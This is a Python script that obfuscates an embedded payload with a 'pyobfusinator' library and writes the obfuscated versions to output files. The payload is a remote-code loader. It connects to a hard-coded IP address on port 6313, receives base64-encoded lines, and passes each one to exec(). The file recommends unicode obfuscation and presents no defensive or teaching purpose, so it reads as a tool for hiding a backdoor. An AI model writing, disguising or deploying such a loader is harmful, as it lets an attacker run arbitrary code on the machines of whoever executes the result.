from pyobfusinator import inflate, deflate, unicode_compress, unicode_decompress

# It is recommended to Obfuscate with UniCode.

code = """
import socket
import json
import base64
import struct

HOST = '87.106.44.40'
PORT = 6313

def encode_unicode(text):
    return base64.b64encode(text.encode('utf-16')).decode('ascii')

def decode_unicode(text):
    return base64.b64decode(text.encode('ascii')).decode('utf-16')

def send_message(sock, data):
    json_data = json.dumps(data).encode('utf-8')
    sock.sendall(struct.pack('>I', len(json_data)))
    sock.sendall(json_data)

def receive_message(sock):
    raw_msglen = sock.recv(4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    data = b''
    while len(data) < msglen:
        chunk = sock.recv(min(msglen - len(data), 1024))
        if not chunk:
            return None
        data += chunk
    return data

data = {
    "command": "app",
    "data": encode_unicode("test")
}

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    send_message(s, data)
    
    response_data = receive_message(s)
    if response_data is not None:
        response = json.loads(response_data.decode('utf-8'))
        
        if isinstance(response.get("message"), list):
            for line in response["message"]:
                decoded_line = decode_unicode(line)
                exec(decoded_line)
        else:
            print(response)
"""

def preprocess_code(input_code: str) -> str:
    return ''.join(c for c in input_code if ord(c) < 128)

code = preprocess_code(code)

inflated_code = inflate(code)
original_code = deflate(inflated_code)

compressed_code = unicode_compress(code)
original_uni_code = unicode_decompress(code)

print(f"obfuscated code: {inflated_code}\n")
print(f"obfuscated unicode: {compressed_code}\n")
print(f"obfuscated decode: {original_code}\n")
print(f"obfuscated deunicode: {original_uni_code}\n")

with open("output/obfuscated.py", "w", encoding="UTF-8") as f:
    f.write(inflated_code)

with open("output/obfuscated_uni.py", "w", encoding="UTF-8") as f:
    f.write(compressed_code)
